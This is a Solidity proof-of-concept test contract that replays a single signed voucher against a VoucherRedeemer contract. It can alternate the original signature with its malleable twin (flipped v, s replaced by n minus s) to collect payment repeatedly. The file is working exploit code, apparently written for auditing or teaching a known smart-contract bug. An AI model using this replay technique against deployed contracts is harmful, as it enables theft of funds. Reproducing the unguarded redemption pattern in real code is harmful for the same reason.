// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {VoucherRedeemer} from "../src/VoucherRedeemer.sol";

/// @notice Signature replay: nothing records that a voucher was used, so the same signature pays
///         again and again.
/// Knobs:
///   0 `twin`     1 makes every other replay use the signature's twin: the same signature with
///                `s` replaced by `n - s` and `v` flipped, which ecrecover also accepts;
///   1 `amount`   the voucher's face value, in wei;
///   2 `replays`  how many times the attacker submits the voucher again after redeeming it.
/// The attacker holds one voucher, legitimately issued, and replays it until it is refused.
contract VoucherReplayPoC is AssayPoC {
    VoucherRedeemer internal redeemer;
    uint256 internal issuerKey;

    function setUpTarget() internal override {
        address issuer;
        (issuer, issuerKey) = makeAddrAndKey("issuer");
        redeemer = new VoucherRedeemer(issuer);
        address sponsor = makeAddr("sponsor");
        vm.deal(sponsor, 20 ether);
        vm.prank(sponsor);
        redeemer.fund{value: 20 ether}();

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "twin", 0, 0, 1);
        declareKnob(1, "amount", 1 ether, 0.01 ether, 2 ether);
        declareKnob(2, "replays", 3, 1, 5);
    }

    function exploit() internal override {
        uint256 amount = knob(1);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(issuerKey, redeemer.voucherDigest(attacker, amount));
        uint8 twinV = v == 27 ? 28 : 27;
        bytes32 twinS = bytes32(SECP256K1_ORDER - uint256(s));
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        redeemer.redeem(attacker, amount, v, r, s);
        for (uint256 i = 0; i < knob(2); i++) {
            bool useTwin = knob(0) == 1 && i % 2 == 0;
            try redeemer.redeem(attacker, amount, useTwin ? twinV : v, r, useTwin ? twinS : s) {}
            catch {
                break;
            }
        }
        vm.stopPrank();

        // The voucher entitles the attacker to `amount` once; anything beyond was paid again.
        attacker_profit("eth", balanceBefore + amount, attacker.balance);
    }
}
